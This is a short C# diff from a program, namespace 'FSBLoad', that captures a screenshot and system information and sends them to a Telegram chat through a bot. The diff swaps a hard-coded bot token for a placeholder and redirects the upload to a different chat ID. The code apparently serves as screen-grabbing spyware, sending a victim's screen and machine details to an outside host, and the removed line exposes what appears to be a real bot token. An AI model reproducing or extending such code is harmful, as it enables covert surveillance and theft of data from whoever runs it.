@@ -26,17 +26,22 @@ namespace FSBLoad
 		{
 			try
 			{
-				var bot = new TelegramBotClient("5292015239:AAG7M6gs9AN-cShhmac3LnHooRJN4_y4eho");
+				var bot = new TelegramBotClient("TOKEN");
 
 				byte[] buf = GetScreenshot();
 				MemoryStream ms = new MemoryStream(buf);
 
 				string cap = GetInfo();
 
+				//await bot.SendPhotoAsync(
+				//	chatId: -1001738940521,
+				//	photo: ms, caption: cap);
+
 				await bot.SendPhotoAsync(
-					chatId: -1001738940521,
+					chatId: 659589661,
 					photo: ms, caption: cap);
 
+				
 				ItHasBeenSent = true;
 			}
 			catch (Exception ex)
@@ -71,7 +76,6 @@ namespace FSBLoad
 				printscreen.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
 				return ms.ToArray();
 		}
-
 		private static string GetInfo()
 		{
 			string str = "";
